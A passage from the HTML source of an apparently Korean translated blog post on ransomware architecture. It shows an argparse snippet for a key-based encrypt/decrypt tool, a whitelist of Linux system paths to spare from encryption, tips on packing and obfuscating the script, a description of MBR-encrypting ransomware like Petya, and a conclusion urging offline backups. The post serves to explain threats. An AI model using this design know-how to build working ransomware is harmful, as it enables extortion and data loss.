&amp;#xC911; &amp;#xD558;&amp;#xB098;&amp;#xB97C; &amp;#xC120;&amp;#xD0DD;&amp;#xD55C; &amp;#xD6C4; &lt;code&gt;.pem&lt;/code&gt; &amp;#xD30C;&amp;#xC77C;&amp;#xC744; &amp;#xC804;&amp;#xB2EC;&amp;#xD558;&amp;#xAE30;&amp;#xB9CC; &amp;#xD558;&amp;#xBA74; &amp;#xB41C;&amp;#xB2E4;. main &amp;#xD638;&amp;#xCD9C; &amp;#xC804;&amp;#xC5D0; &amp;#xBC14;&amp;#xC774;&amp;#xB108;&amp;#xB9AC;&amp;#xC5D0; &amp;#xC774;&amp;#xAC83;&amp;#xACFC; &amp;#xBE44;&amp;#xC2B7;&amp;#xD55C; &amp;#xAC83;&amp;#xC774; &amp;#xC788;&amp;#xC744; &amp;#xAC83;&amp;#xC774;&amp;#xB2E4;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs python&#34;&gt;parser = argparse.ArgumentParser()
parser.add_argument(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;--dest&amp;quot;&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;-d&amp;quot;&lt;/span&gt;, help=&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;File or directory to encrypt/decrypt&amp;quot;&lt;/span&gt;, dest=&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;destination&amp;quot;&lt;/span&gt;, default=&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;none&amp;quot;&lt;/span&gt;, required=&lt;span class=&#34;hljs-literal&#34;&gt;True&lt;/span&gt;)
parser.add_argument(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;--action&amp;quot;&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;-a&amp;quot;&lt;/span&gt;, help=&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;Action (encrypt/decrypt)&amp;quot;&lt;/span&gt;, dest=&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;action&amp;quot;&lt;/span&gt;, required=&lt;span class=&#34;hljs-literal&#34;&gt;True&lt;/span&gt;)
 
parser.add_argument(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;--pem&amp;quot;&lt;/span&gt;,&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;-p&amp;quot;&lt;/span&gt;, help=&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;Public/Private key&amp;quot;&lt;/span&gt;, dest=&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;key&amp;quot;&lt;/span&gt;, required=&lt;span class=&#34;hljs-literal&#34;&gt;True&lt;/span&gt;)&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;#xC624;&amp;#xB958; &amp;#xAC80;&amp;#xC0AC;(&amp;#xC554;&amp;#xD638;&amp;#xD654; &amp;#xC791;&amp;#xC5C5;&amp;#xC5D0; &amp;#xD30C;&amp;#xB77C;&amp;#xBBF8;&amp;#xD130;&amp;#xB85C; public key&amp;#xAC00; &amp;#xC804;&amp;#xB2EC;&amp;#xB418;&amp;#xB294;&amp;#xC9C0;, decrypt&amp;#xC5D0; private key&amp;#xAC00; &amp;#xC788;&amp;#xB294;&amp;#xC9C0; &amp;#xB4F1;) &amp;#xC678;&amp;#xC5D0;&amp;#xB3C4; &amp;#xC6B4;&amp;#xC601; &amp;#xCCB4;&amp;#xC81C;&amp;#xC5D0; &amp;#xB300;&amp;#xD55C; &amp;#xD30C;&amp;#xC77C; &amp;#xBC0F; &amp;#xD3F4;&amp;#xB354;&amp;#xB97C; &amp;#xD654;&amp;#xC774;&amp;#xD2B8; &amp;#xB9AC;&amp;#xC2A4;&amp;#xD2B8;&amp;#xB85C; &amp;#xC9C0;&amp;#xC815;&amp;#xD574;&amp;#xC57C; &amp;#xD55C;&amp;#xB2E4;. &amp;#xC554;&amp;#xD638;&amp;#xD654;&amp;#xB418;&amp;#xB354;&amp;#xB77C;&amp;#xB3C4; &amp;#xCEF4;&amp;#xD4E8;&amp;#xD130;&amp;#xB294; &amp;#xC0AC;&amp;#xC6A9;&amp;#xC774; &amp;#xAC00;&amp;#xB2A5;&amp;#xD558;&amp;#xB3C4;&amp;#xB85D; &amp;#xD574;&amp;#xC57C; &amp;#xD55C;&amp;#xB2E4;. &amp;#xBAA8;&amp;#xB4E0; &amp;#xD30C;&amp;#xC77C;&amp;#xC744; &amp;#xC554;&amp;#xD638;&amp;#xD654;&amp;#xD55C;&amp;#xB2E4;&amp;#xBA74; &amp;#xB2E4;&amp;#xC74C;&amp;#xACFC; &amp;#xAC19;&amp;#xC740; &amp;#xACB0;&amp;#xACFC;&amp;#xB97C; &amp;#xBCFC; &amp;#xC218; &amp;#xC788;&amp;#xB2E4;.&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&amp;#xC0AC;&amp;#xC6A9;&amp;#xC790;&amp;#xAC00; &amp;#xBB54;&amp;#xAC00; &amp;#xC798;&amp;#xBABB;&amp;#xB41C; &amp;#xAC78; &amp;#xC54C; &amp;#xC218; &amp;#xC788;&amp;#xB3C4;&amp;#xB85D; &amp;#xCEF4;&amp;#xD4E8;&amp;#xD130; &amp;#xC0AC;&amp;#xC6A9;&amp;#xC774; &amp;#xBD88;&amp;#xAC00;&amp;#xB2A5;&amp;#xD574;&amp;#xC9C4;&amp;#xB2E4;.&lt;/li&gt;
&lt;li&gt;&amp;#xC804;&amp;#xBD80; &amp;#xC554;&amp;#xD638;&amp;#xD654;&amp;#xB41C; &amp;#xD6C4;, &amp;#xC2DC;&amp;#xC2A4;&amp;#xD15C;&amp;#xC774; &amp;#xBD80;&amp;#xD305;&amp;#xC774; &amp;#xC548;&amp;#xB418;&amp;#xACE0; &amp;#xC0AC;&amp;#xC6A9;&amp;#xC790;&amp;#xB294; &amp;#xB79C;&amp;#xC12C;&amp;#xC6E8;&amp;#xC5B4;&amp;#xC5D0; &amp;#xAC10;&amp;#xC5FC;&amp;#xB41C; &amp;#xC0AC;&amp;#xC2E4;&amp;#xC744; &amp;#xC54C;&amp;#xC9C0; &amp;#xBABB;&amp;#xD55C;&amp;#xB2E4;.&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&amp;#xC608;&amp;#xC2DC;&amp;#xB85C; &amp;#xB9AC;&amp;#xB205;&amp;#xC2A4; &amp;#xD654;&amp;#xC774;&amp;#xD2B8; &amp;#xB9AC;&amp;#xC2A4;&amp;#xD2B8;&amp;#xB294; &amp;#xB2E4;&amp;#xC74C;&amp;#xACFC; &amp;#xAC19;&amp;#xB2E4;.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs ini&#34;&gt;&lt;span class=&#34;hljs-attr&#34;&gt;whitelist&lt;/span&gt; = [&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;/etc/ssh&amp;quot;&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;/etc/pam.d&amp;quot;&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;/etc/security/&amp;quot;&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;/boot&amp;quot;&lt;/span&gt;,
&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;/run&amp;quot;&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;/usr&amp;quot;&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;/snap&amp;quot;&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;/var&amp;quot;&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;/sys&amp;quot;&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;/proc&amp;quot;&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;/dev&amp;quot;&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;/bin&amp;quot;&lt;/span&gt;,
&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;/sbin&amp;quot;&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;/lib&amp;quot;&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;passwd&amp;quot;&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;shadow&amp;quot;&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;known_hosts&amp;quot;&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;sshd_config&amp;quot;&lt;/span&gt;,
&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;/home/sec/.viminfo&amp;quot;&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;/etc/crontab&amp;apos;&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;/etc/default/locale&amp;quot;&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;/etc/environment&amp;quot;&lt;/span&gt;]&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;.py&lt;/code&gt; &amp;#xC2A4;&amp;#xD06C;&amp;#xB9BD;&amp;#xD2B8;&amp;#xB97C; &amp;#xBAA8;&amp;#xB4E0; dependency&amp;#xC640; &amp;#xD568;&amp;#xAED8; &amp;#xC555;&amp;#xCD95;&amp;#xD558;&amp;#xC5EC; &amp;#xB2E8;&amp;#xC77C; &amp;#xC2E4;&amp;#xD589; &amp;#xD30C;&amp;#xC77C;&amp;#xB85C; &amp;#xB9CC;&amp;#xB4E4; &amp;#xC218; &amp;#xC788;&amp;#xB2E4;. &amp;#xC77C;&amp;#xC77C;&amp;#xC774; &amp;#xC54C;&amp;#xB824;&amp;#xC8FC;&amp;#xC9C4; &amp;#xC54A;&amp;#xACA0;&amp;#xC9C0;&amp;#xB9CC; &lt;a href=&#34;https://pypi.org/project/pyarmor/&#34;&gt;pyarmor&lt;/a&gt;&amp;#xC640; &lt;a href=&#34;https://www.pyinstaller.org/&#34;&gt;pyinstaller&lt;/a&gt;&amp;#xB97C; &amp;#xCC3E;&amp;#xC544;&amp;#xBCF4;&amp;#xBA74; &amp;#xB41C;&amp;#xB2E4;. &amp;#xB610; &amp;#xC0AC;&amp;#xC6A9;&amp;#xD558;&amp;#xB824;&amp;#xB294; &amp;#xB09C;&amp;#xB3C5;&amp;#xD654;&amp;#xC5D0; &amp;#xB530;&amp;#xB77C;&amp;#xC11C; &lt;a href=&#34;https://github.com/Nuitka/Nuitka&#34;&gt;Nuitka&lt;/a&gt;&amp;#xAC00; &amp;#xB3C4;&amp;#xC6C0;&amp;#xC774; &amp;#xB420; &amp;#xC218;&amp;#xB3C4; &amp;#xC788;&amp;#xB2E4;.&lt;/p&gt;
&lt;h1 id=&#34;&amp;#xB2E4;&amp;#xB978;-&amp;#xC885;&amp;#xB958;&amp;#xC758;-&amp;#xB79C;&amp;#xC12C;&amp;#xC6E8;&amp;#xC5B4;-MBR-&amp;#xC554;&amp;#xD638;&amp;#xD654;&#34;&gt;&lt;a href=&#34;#&amp;#xB2E4;&amp;#xB978;-&amp;#xC885;&amp;#xB958;&amp;#xC758;-&amp;#xB79C;&amp;#xC12C;&amp;#xC6E8;&amp;#xC5B4;-MBR-&amp;#xC554;&amp;#xD638;&amp;#xD654;&#34; class=&#34;headerlink&#34; title=&#34;&amp;#xB2E4;&amp;#xB978; &amp;#xC885;&amp;#xB958;&amp;#xC758; &amp;#xB79C;&amp;#xC12C;&amp;#xC6E8;&amp;#xC5B4;(MBR &amp;#xC554;&amp;#xD638;&amp;#xD654;)&#34;&gt;&lt;/a&gt;&amp;#xB2E4;&amp;#xB978; &amp;#xC885;&amp;#xB958;&amp;#xC758; &amp;#xB79C;&amp;#xC12C;&amp;#xC6E8;&amp;#xC5B4;(MBR &amp;#xC554;&amp;#xD638;&amp;#xD654;)&lt;/h1&gt;&lt;p&gt;&amp;#xC6B0;&amp;#xB9AC;&amp;#xAC00; &amp;#xC0B4;&amp;#xD3B4;&amp;#xBCF4;&amp;#xC9C0; &amp;#xC54A;&amp;#xC740; &amp;#xB4DC;&amp;#xB77C;&amp;#xC774;&amp;#xBE0C;&amp;#xC758; &lt;a href=&#34;https://en.wikipedia.org/wiki/Master_boot_record&#34;&gt;Master Boot Record&lt;/a&gt;&amp;#xB97C; &amp;#xAC10;&amp;#xC5FC;&amp;#xC2DC;&amp;#xD0A4;&amp;#xB294; &amp;#xB2E4;&amp;#xB978; &amp;#xC885;&amp;#xB958;&amp;#xC758; &amp;#xB79C;&amp;#xC12C;&amp;#xC6E8;&amp;#xC5B4;&amp;#xAC00; &amp;#xC788;&amp;#xB2E4;. &amp;#xD30C;&amp;#xC77C; &amp;#xC2DC;&amp;#xC2A4;&amp;#xD15C;&amp;#xC758; NTFS &amp;#xD30C;&amp;#xC77C; &amp;#xD14C;&amp;#xC774;&amp;#xBE14;&amp;#xC744; &amp;#xC554;&amp;#xD638;&amp;#xD654;&amp;#xD558;&amp;#xB294; &amp;#xD398;&amp;#xC774;&amp;#xB85C;&amp;#xB4DC;&amp;#xB97C; &amp;#xC2E4;&amp;#xD589;&amp;#xD558;&amp;#xC5EC; &amp;#xB514;&amp;#xC2A4;&amp;#xD06C;&amp;#xB97C; &amp;#xC0AC;&amp;#xC6A9;&amp;#xD560; &amp;#xC218; &amp;#xC5C6;&amp;#xAC8C; &amp;#xB9CC;&amp;#xB4E0;&amp;#xB2E4;. &amp;#xC774; &amp;#xBC29;&amp;#xBC95;&amp;#xC740; &amp;#xB370;&amp;#xC774;&amp;#xD130;&amp;#xC758; &amp;#xC791;&amp;#xC740; &amp;#xBD80;&amp;#xBD84;&amp;#xB9CC; &amp;#xC554;&amp;#xD638;&amp;#xD654;&amp;#xD558;&amp;#xBA74; &amp;#xB3FC;&amp;#xC11C; &amp;#xB9E4;&amp;#xC6B0; &amp;#xBE60;&amp;#xB974;&amp;#xB2E4;. &lt;a href=&#34;https://en.wikipedia.org/wiki/Petya_(malware&#34;&gt;Petya &amp;#xB79C;&amp;#xC12C;&amp;#xC6E8;&amp;#xC5B4;&lt;/a&gt;)&amp;#xAC00; &amp;#xC774; &amp;#xC885;&amp;#xB958;&amp;#xC758; &amp;#xC644;&amp;#xBCBD;&amp;#xD55C; &amp;#xC608;&amp;#xC2DC;&amp;#xC774;&amp;#xB2E4;. &amp;#xD558;&amp;#xC9C0;&amp;#xB9CC; &amp;#xC774;&amp;#xB294; 3&amp;#xAC1C;&amp;#xC758; &amp;#xC8FC;&amp;#xC694;&amp;#xD55C; &amp;#xB2E8;&amp;#xC810;&amp;#xC744; &amp;#xAC00;&amp;#xC9C0;&amp;#xACE0; &amp;#xC788;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;&amp;#xCCAB; &amp;#xBC88;&amp;#xC9F8;&amp;#xB85C; OS&amp;#xB97C; &amp;#xBD80;&amp;#xD305;&amp;#xD560; &amp;#xC218; &amp;#xC5C6;&amp;#xC5B4;&amp;#xB3C4; &amp;#xD3EC;&amp;#xB80C;&amp;#xC2DD; &amp;#xBD84;&amp;#xC11D;&amp;#xC744; &amp;#xD1B5;&amp;#xD574; &amp;#xD30C;&amp;#xC77C;&amp;#xC744; &amp;#xBCF5;&amp;#xAD6C;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xB2E4;. &amp;#xD30C;&amp;#xC77C;&amp;#xB4E4;&amp;#xC740; &amp;#xC0AD;&amp;#xC81C;&amp;#xB418;&amp;#xC9C0; &amp;#xC54A;&amp;#xACE0; &amp;#xD30C;&amp;#xC77C; &amp;#xD14C;&amp;#xC774;&amp;#xBE14;&amp;#xC5D0;&amp;#xC11C; &amp;#xCC38;&amp;#xC870;&amp;#xB418;&amp;#xC9C0; &amp;#xC54A;&amp;#xC744; &amp;#xB420; &amp;#xBFD0;&amp;#xC774;&amp;#xB2E4;. &amp;#xCEF4;&amp;#xD4E8;&amp;#xD130;&amp;#xAC00; &amp;#xC7AC;&amp;#xBD80;&amp;#xD305; &amp;#xB41C; &amp;#xD6C4;&amp;#xC5D0; raw data&amp;#xB97C; &amp;#xC554;&amp;#xD638;&amp;#xD654; &amp;#xD558;&amp;#xB354;&amp;#xB77C;&amp;#xB3C4; victim&amp;#xC774; &amp;#xCEF4;&amp;#xD4E8;&amp;#xD130;&amp;#xB97C; &amp;#xB044;&amp;#xACE0; &amp;#xB514;&amp;#xC2A4;&amp;#xD06C;&amp;#xB97C; &amp;#xBE7C;&amp;#xBC84;&amp;#xB9AC;&amp;#xBA74; &amp;#xC77C;&amp;#xBD80; &amp;#xD30C;&amp;#xC77C;&amp;#xC744; &amp;#xBCF5;&amp;#xAD6C;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;&amp;#xB450; &amp;#xBC88;&amp;#xC9F8; &amp;#xB2E8;&amp;#xC810;&amp;#xC740; &amp;#xB300;&amp;#xBD80;&amp;#xBD84; &lt;a href=&#34;https://www.howtogeek.com/193669/whats-the-difference-between-gpt-and-mbr-when-partitioning-a-drive/&#34;&gt;&amp;#xCD5C;&amp;#xC2E0; OS&amp;#xB294; GPT(GUID Partition Table)&amp;#xC744; &amp;#xC0AC;&amp;#xC6A9;&amp;#xD558;&amp;#xC5EC; MBR&amp;#xC744; &amp;#xB354; &amp;#xC774;&amp;#xC0C1; &amp;#xC4F0;&amp;#xC9C0; &amp;#xC54A;&amp;#xB294;&amp;#xB2E4;&lt;/a&gt;&amp;#xB294; &amp;#xAC83;&amp;#xC774;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;&amp;#xC138; &amp;#xBC88;&amp;#xC9F8; &amp;#xB2E8;&amp;#xC810;&amp;#xC740; &amp;#xD30C;&amp;#xC77C; &amp;#xC2DC;&amp;#xC2A4;&amp;#xD15C; &amp;#xC758;&amp;#xC874;&amp;#xC131;&amp;#xC774; &amp;#xB192;&amp;#xACE0; NTFS&amp;#xCC98;&amp;#xB7FC; &amp;#xB3D9;&amp;#xC791;&amp;#xD558;&amp;#xC9C0; &amp;#xC54A;&amp;#xB294; &amp;#xD30C;&amp;#xC77C; &amp;#xC2DC;&amp;#xC2A4;&amp;#xD15C;(EXT3/EXT4, ZFS &amp;#xB4F1;)&amp;#xB3C4; &amp;#xACE0;&amp;#xB824;&amp;#xD558;&amp;#xAE30; &amp;#xC704;&amp;#xD574; &amp;#xC218;&amp;#xC815;&amp;#xD574;&amp;#xC57C; &amp;#xD55C;&amp;#xB2E4;&amp;#xB294; &amp;#xC810;&amp;#xC774;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;&amp;#xC774; &amp;#xBC29;&amp;#xBC95;&amp;#xC740; &amp;#xB354; &amp;#xB9CE;&amp;#xC740; low-level technical concept&amp;#xC744; &amp;#xC694;&amp;#xAD6C;&amp;#xD558;&amp;#xC5EC; &amp;#xC774; &amp;#xAC8C;&amp;#xC2DC;&amp;#xAE00;&amp;#xC5D0;&amp;#xC11C; &amp;#xB9CE;&amp;#xC774; &amp;#xC124;&amp;#xBA85;&amp;#xD558;&amp;#xACE0; &amp;#xC2F6;&amp;#xC9C0; &amp;#xC54A;&amp;#xB2E4;. &amp;#xB610;&amp;#xD55C; &amp;#xC774; &amp;#xBC29;&amp;#xBC95;&amp;#xB860;&amp;#xC740; &amp;#xB9CE;&amp;#xC774; &amp;#xC0AC;&amp;#xC6A9;&amp;#xB418;&amp;#xC9C0; &amp;#xC54A;&amp;#xB294;&amp;#xB2E4;. &amp;#xD544;&amp;#xC790;&amp;#xC758; &amp;#xC8FC;&amp;#xBAA9;&amp;#xC801;&amp;#xC740; &amp;#xC77C;&amp;#xBC18;&amp;#xC801;&amp;#xC778; &amp;#xB79C;&amp;#xC12C;&amp;#xC6E8;&amp;#xC5B4;&amp;#xC5D0; &amp;#xB300;&amp;#xD574; &amp;#xB3C5;&amp;#xC790;&amp;#xB4E4;&amp;#xC774; &amp;#xB354; &amp;#xC798; &amp;#xC774;&amp;#xD574;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xB3C4;&amp;#xB85D; &amp;#xD558;&amp;#xB294; &amp;#xAC83;&amp;#xC774;&amp;#xB2E4;.&lt;/p&gt;
&lt;h1 id=&#34;&amp;#xACB0;&amp;#xB860;&#34;&gt;&lt;a href=&#34;#&amp;#xACB0;&amp;#xB860;&#34; class=&#34;headerlink&#34; title=&#34;&amp;#xACB0;&amp;#xB860;&#34;&gt;&lt;/a&gt;&amp;#xACB0;&amp;#xB860;&lt;/h1&gt;&lt;p&gt;&amp;#xB79C;&amp;#xC12C;&amp;#xC6E8;&amp;#xC5B4;&amp;#xB97C; &amp;#xBC29;&amp;#xC9C0;&amp;#xD558;&amp;#xB294; &amp;#xBC29;&amp;#xBC95;&amp;#xB4E4;(&amp;#xCD9C;&amp;#xCC98;&amp;#xB97C; &amp;#xC54C; &amp;#xC218; &amp;#xC5C6;&amp;#xB294; &amp;#xD30C;&amp;#xC77C; &amp;#xC5F4;&amp;#xC9C0; &amp;#xB9D0;&amp;#xAE30;, &amp;#xC778;&amp;#xD504;&amp;#xB77C; &amp;#xC5C5;&amp;#xB370;&amp;#xC774;&amp;#xD2B8; &amp;#xC720;&amp;#xC9C0;, &amp;#xC548;&amp;#xD2F0; &amp;#xBA40;&amp;#xC6E8;&amp;#xC5B4; &amp;#xC18C;&amp;#xD504;&amp;#xD2B8;&amp;#xC6E8;&amp;#xC5B4; &amp;#xC0AC;&amp;#xC6A9;&amp;#xD558;&amp;#xAE30; &amp;#xB4F1;&amp;#xB4F1;) &amp;#xC678;&amp;#xC5D0;&amp;#xB3C4; &amp;#xCD94;&amp;#xCC9C;&amp;#xD558;&amp;#xB294; &amp;#xBC29;&amp;#xBC95;&amp;#xC740; &amp;#xBC31;&amp;#xC5C5;&amp;#xACFC; &amp;#xBC31;&amp;#xC5C5; &amp;#xADF8;&amp;#xB9AC;&amp;#xACE0; &amp;#xB610; &amp;#xBC31;&amp;#xC5C5;&amp;#xC774;&amp;#xB2E4;. &amp;#xACF5;&amp;#xACA9;&amp;#xC744; &amp;#xB9C9;&amp;#xAE30; &amp;#xC704;&amp;#xD55C; &amp;#xB9CE;&amp;#xC740; &amp;#xC870;&amp;#xC5B8;&amp;#xC744; &amp;#xB4E3;&amp;#xAC8C; &amp;#xB418;&amp;#xACA0;&amp;#xC9C0;&amp;#xB9CC; &amp;#xD544;&amp;#xC790;&amp;#xC758; &amp;#xC0DD;&amp;#xAC01;&amp;#xC5D0;&amp;#xB294; &amp;#xADF8;&amp;#xB0E5; &amp;#xAC78;&amp;#xB9B4; &amp;#xAC70;&amp;#xB77C; &amp;#xC0DD;&amp;#xAC01;&amp;#xD558;&amp;#xACE0; &amp;#xB370;&amp;#xC774;&amp;#xD130;&amp;#xB97C; &amp;#xC624;&amp;#xD504;&amp;#xB77C;&amp;#xC778; &amp;#xBC31;&amp;#xC5C5;&amp;#xD558;&amp;#xB294; &amp;#xAC83;&amp;#xC774;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2021/04/25/idioth/arch_of_ransomware_part2/Untitled%207.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;&amp;#xB2F9;&amp;#xC2E0;&amp;#xC774; &amp;#xAC10;&amp;#xC5FC;&amp;#xC744; &amp;#xD53C;&amp;#xD55C;&amp;#xB2E4; &amp;#xD574;&amp;#xB3C4; &amp;#xB3D9;&amp;#xB8CC; &amp;#xC9C1;&amp;#xC6D0;&amp;#xC774; &amp;#xAC78;&amp;#xB9AC;&amp;#xBA74; &amp;#xB9E4;&amp;#xD551;&amp;#xB41C; &amp;#xACF5;&amp;#xC720; &amp;#xB4DC;&amp;#xB77C;&amp;#xC774;&amp;#xBE0C;&amp;#xC758; &amp;#xBAA8;&amp;#xB4E0; &amp;#xD30C;&amp;#xC77C;&amp;#xC774; &amp;#xC554;&amp;#xD638;&amp;#xD654; &amp;#xB420; &amp;#xAC83;&amp;#xC774;&amp;#xB2E4;.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&amp;#xB9C8;&amp;#xC9C0;&amp;#xB9C9;&amp;#xC73C;&amp;#xB85C; &amp;#xC544;&amp;#xBB34;&amp;#xB3C4; &amp;#xCD94;&amp;#xCC9C;&amp;#xD558;&amp;#xC9C0; &amp;#xC54A;&amp;#xC740; &amp;#xBC29;&amp;#xBC95;: &amp;#xAC10;&amp;#xC5FC;&amp;#xB41C; &amp;#xACBD;&amp;#xC6B0;, &amp;#xC554;&amp;#xD638;&amp;#xD654;&amp;#xB41C; &amp;#xD30C;&amp;#xC77C;(&amp;#xAC00;&amp;#xC871;&amp;#xC0AC;&amp;#xC9C4;, &amp;#xBE44;&amp;#xB514;&amp;#xC624; &amp;#xB4F1;)&amp;#xC744; &amp;#xBC14;&amp;#xB85C; &amp;#xBCF5;&amp;#xAD6C;&amp;#xD560; &amp;#xD544;&amp;#xC694;&amp;#xAC00; &amp;#xC5C6;&amp;#xC73C;&amp;#xBA74; &amp;#xC554;&amp;#xD638;&amp;#xD654;&amp;#xB41C; &amp;#xD30C;&amp;#xC77C;&amp;#xC758; &amp;#xBCF5;&amp;#xC0AC;&amp;#xBCF8;&amp;#xC744; &amp;#xBCF4;&amp;#xAD00;&amp;#xD574;&amp;#xB77C;. &amp;#xBA40;&amp;#xC6E8;&amp;#xC5B4; &amp;#xAC1C;&amp;#xBC1C;&amp;#xC790;&amp;#xAC00; &amp;#xC740;&amp;#xD1F4;(Shade, TeslaCrypt, HildaCrypt)&amp;#xD558;&amp;#xAC70;&amp;#xB098; &amp;#xCCB4;&amp;#xD3EC;(CoinVault)&amp;#xB418;&amp;#xAC70;&amp;#xB098; &amp;#xACBD;&amp;#xC7C1;&amp;#xC790;&amp;#xC758; &amp;#xD0A4;&amp;#xB97C; &amp;#xBC30;&amp;#xD3EC;(Petya vs Chimera)&amp;#xD558;&amp;#xB294; &amp;#xB4F1; &amp;#xD574;&amp;#xB3C5; &amp;#xD0A4;&amp;#xAC00; &amp;#xACF5;&amp;#xAC1C;&amp;#xB420; &amp;#xC218; &amp;#xC788;&amp;#xB2E4;. &amp;#xC6B4; &amp;#xC88B;&amp;#xC73C;&amp;#xBA74; &amp;#xBA87; &amp;#xB2EC; &amp;#xC548;&amp;#xC5D0; &amp;#xBCF5;&amp;#xAD6C;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xB2E4;.&lt;/p&gt;
&lt;/blockquote&gt;
 - hack &amp; life">
  <meta name="author" content="j0dev, y2sman">
  <meta name="keywords" content>
  <meta name="google-site-verification" content="DXkyiaX95-ws53Tyt0m91_umRf4gfV2qJIQZ5zQDIO4">
  <meta name="naver-site-verification" content="0b4fea742ed293b82621684e466d9f26c3ccee06">


  <meta property="og:type" content="website"> 
  <meta property="og:title" content="[Translation] Architecture of Ransomware Part 2 - hackyboiz">
  <meta property="og:description" content="&lt;p&gt;&amp;#xC548;&amp;#xB155;&amp;#xD558;&amp;#xC138;&amp;#xC694;! idioth&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xAE38;&amp;#xACE0; &amp;#xAE38;&amp;#xC5C8;&amp;#xB358; &amp;#xC911;&amp;#xAC04;&amp;#xACE0;&amp;#xC0AC; &amp;#xAE30;&amp;#xAC04;&amp;#xC774;&amp;#xC5C8;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xD558;&amp;#xC9C0;&amp;#xB9CC; &amp;#xC81C; &amp;#xC911;&amp;#xAC04;&amp;#xACE0;&amp;#xC0AC; &amp;#xAE30;&amp;#xAC04;&amp;#xC740; &amp;#xB354; &amp;#xAE38;&amp;#xC5B4;&amp;#xC11C; &amp;#xC544;&amp;#xC9C1; &amp;#xB05D;&amp;#xB098;&amp;#xC9C0; &amp;#xC54A;&amp;#xC558;&amp;#xB124;&amp;#xC694;. &amp;#xC2DC;&amp;#xD5D8; &amp;#xD558;&amp;#xB098;&amp;#xC640; &amp;#xB300;&amp;#xCCB4; &amp;#xACFC;&amp;#xC81C; 3&amp;#xAC1C;&amp;#xAC00; &amp;#xB0A8;&amp;#xC544;&amp;#xC788;&amp;#xB294; &amp;#xC0B6;&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xAC8C;&amp;#xB2E4;&amp;#xAC00; &amp;#xACFC;&amp;#xBAA9; &amp;#xD558;&amp;#xB098;&amp;#xB294; &amp;#xC591;&amp;#xC774; &amp;#xB108;&amp;#xBB34; &amp;#xB9CE;&amp;#xC544;&amp;#xC11C; &amp;#xC120;&amp;#xD0DD;&amp;#xACFC; &amp;#xC9D1;&amp;#xC911;&amp;#xC744; &amp;#xD588;&amp;#xB294;&amp;#xB370; &amp;#xC81C;&amp;#xAC00; &amp;#xC120;&amp;#xD0DD;&amp;#xD55C; &amp;#xBD80;&amp;#xBD84;&amp;#xC5D0;&amp;#xC11C; 12 &amp;#xBB38;&amp;#xC81C; &amp;#xC911; &amp;#xD55C; &amp;#xBB38;&amp;#xC81C; &amp;#xB098;&amp;#xC654;&amp;#xB124;&amp;#xC694;. 10&amp;#xC810; &amp;#xBC11;&amp;#xC73C;&amp;#xB85C; &amp;#xBC1B;&amp;#xC744; &amp;#xAC83; &amp;#xAC19;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xD558;&amp;#xD558;&amp;#xD558;&amp;#xD558;&amp;#xD558;&amp;#xD558;&amp;#xD558;&amp;#xD558;&amp;#xD558;&amp;#xD558;&lt;/p&gt;
